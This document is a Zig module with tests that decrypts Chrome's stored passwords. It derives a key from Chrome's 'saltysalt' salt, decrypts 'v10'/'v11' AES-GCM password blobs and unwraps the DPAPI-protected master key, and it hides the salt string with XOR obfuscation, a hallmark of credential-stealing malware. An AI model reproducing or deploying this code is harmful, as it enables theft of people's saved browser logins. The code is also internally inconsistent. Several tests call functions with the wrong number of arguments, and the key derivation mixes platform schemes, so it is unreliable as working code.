const std = @import("std");
const crypto = std.crypto;
const hash = @import("../types/hash.zig");
const testing = std.testing;

const E = struct {
    pub const chrome_salt = hash.xorEncrypt("saltysalt");
};

pub fn deriveKey() ![32]u8 {
    var salt_buf: [E.chrome_salt.len]u8 = undefined;
    hash.xorDecrypt(&E.chrome_salt, &salt_buf);

    var key: [32]u8 = undefined;
    try crypto.pwhash.pbkdf2(
        &key,
        &salt_buf,
        &salt_buf,
        CHROME_ITERATIONS,
        crypto.auth.hmac.HmacSha1,
    );
    return key;
}

pub fn decryptPassword(encrypted: []const u8, key: [32]u8, out: []u8) ?[]u8 {
    const min_len = 3 + crypto.aead.aes_gcm.Aes256Gcm.nonce_length + 16;
    if (encrypted.len < min_len) return null;
    if (out.len < encrypted.len - 15 - 16) return null;

    const version = encrypted[0..3];
    const is_v10 = std.mem.eql(u8, version, "v10");
    const is_v11 = std.mem.eql(u8, version, "v11");
    if (!is_v10 and !is_v11) return null;

    const nonce = encrypted[3..15];
    const ciphertext = encrypted[15 .. encrypted.len - 16];
    const tag = encrypted[encrypted.len - 16 ..];

    var nonce_buf: [12]u8 = undefined;
    @memcpy(&nonce_buf, nonce);

    var tag_arr: [16]u8 = undefined;
    @memcpy(&tag_arr, tag);

    crypto.aead.aes_gcm.Aes256Gcm.decrypt(
        out[0..ciphertext.len],
        ciphertext,
        tag_arr,
        "",
        nonce_buf,
        key,
    ) catch return null;

    return out[0..ciphertext.len];
}

pub fn decryptEncryptedKey(encrypted_key: []const u8, out: *[256]u8) ?[]u8 {
    if (encrypted_key.len < 2) return null;
    const version = encrypted_key[0];
    if (version != 1) return null;

    const payload = encrypted_key[1..];
    const dpapi_result = @import("dpapi.zig").decrypt(payload) orelse return null;

    const copy_len = @min(dpapi_result.len, out.len);
    @memcpy(out[0..copy_len], dpapi_result[0..copy_len]);
    return out[0..copy_len];
}

const CHROME_ITERATIONS: u32 = 1003;

test "deriveKey deterministic" {
    const a = try deriveKey();
    const b = try deriveKey();
    try testing.expectEqualSlices(u8, &a, &b);
}

test "deriveKey length" {
    const key = try deriveKey();
    try testing.expect(key.len == 32);
}

test "decryptPassword rejects wrong version" {
    var key: [32]u8 = undefined;
    @memset(&key, 0);
    try testing.expect(decryptPassword("bad", key) == null);
    try testing.expect(decryptPassword("v09" ++ ([_]u8{0} ** 30), key) == null);
    try testing.expect(decryptPassword("xyz" ++ ([_]u8{0} ** 30), key) == null);
}

test "decryptPassword rejects short input" {
    var key: [32]u8 = undefined;
    @memset(&key, 0);
    try testing.expect(decryptPassword("", key) == null);
    try testing.expect(decryptPassword("v10", key) == null);
    try testing.expect(decryptPassword("v10" ++ ([_]u8{0} ** 10), key) == null);
}

test "decryptPassword valid structure but wrong key" {
    var key: [32]u8 = undefined;
    @memset(&key, 0xAB);

    var encrypted: [3 + 12 + 16 + 16]u8 = undefined;
    @memcpy(encrypted[0..3], "v10");
    @memset(encrypted[3..], 0x42);

    try testing.expect(decryptPassword(&encrypted, key) == null);
}

test "decryptEncryptedKey rejects short input" {
    try testing.expect(decryptEncryptedKey("") == null);
    try testing.expect(decryptEncryptedKey(&[_]u8{1}) == null);
}

test "decryptEncryptedKey rejects wrong version" {
    try testing.expect(decryptEncryptedKey(&[_]u8{0, 0}) == null);
    try testing.expect(decryptEncryptedKey(&[_]u8{2, 0}) == null);
    try testing.expect(decryptEncryptedKey(&[_]u8{3, 0}) == null);
}

test "decryptEncryptedKey version 1 calls DPAPI (expected fail on fake blob)" {
    const blob = [_]u8{1} ++ [_]u8{0x00} ** 30;
    try testing.expect(decryptEncryptedKey(&blob) == null);
}
